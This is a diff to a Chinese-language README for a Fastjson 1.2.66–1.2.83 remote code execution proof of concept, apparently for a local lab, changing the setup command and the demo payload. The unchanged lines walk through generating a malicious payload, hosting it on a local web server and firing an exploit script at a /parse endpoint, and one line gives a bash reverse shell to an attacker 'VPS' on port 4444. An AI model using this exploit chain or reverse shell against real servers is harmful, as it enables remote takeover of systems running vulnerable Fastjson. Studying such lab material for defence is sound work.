@@ -11,7 +11,7 @@ Fastjson 1.2.66 ~ 1.2.83 `checkAutoType` 中 `@JSONType` 注解探测路径存�
 ### Step 1: 启动靶场
 
 ```bash
-java -jar fastjson-rce-env-1.0.0.jar
+docker compose up -d
 ```
 
 访问 http://127.0.0.1:18080/ 确认启动成功
@@ -23,7 +23,7 @@ java -jar fastjson-rce-env-1.0.0.jar
 javac -cp "poc/lib/*" -d poc poc/GenProbe.java
 
 # 生成（参数: IP 端口 命令）
-java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 127.0.0.1 19090 "open -a Calculator"
+java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 127.0.0.1 19090 "touch /tmp/pwned"
 ```
 
 Windows 弹计算器改最后参数为 `"calc"`，反弹 shell 改为 `"bash -i >& /dev/tcp/VPS/4444 0>&1"`
@@ -34,7 +34,7 @@ Windows 弹计算器改最后参数为 `"calc"`，反弹 shell 改为 `"bash -i 
 cd poc/www && python3 -m http.server 19090
 ```
 
-### Step 4: 弹计算器
+### Step 4: 命令执行验证
 
 ```bash
 python3 poc/exp.py -u http://127.0.0.1:18080/parse -poc http://127.0.0.1:19090/probe
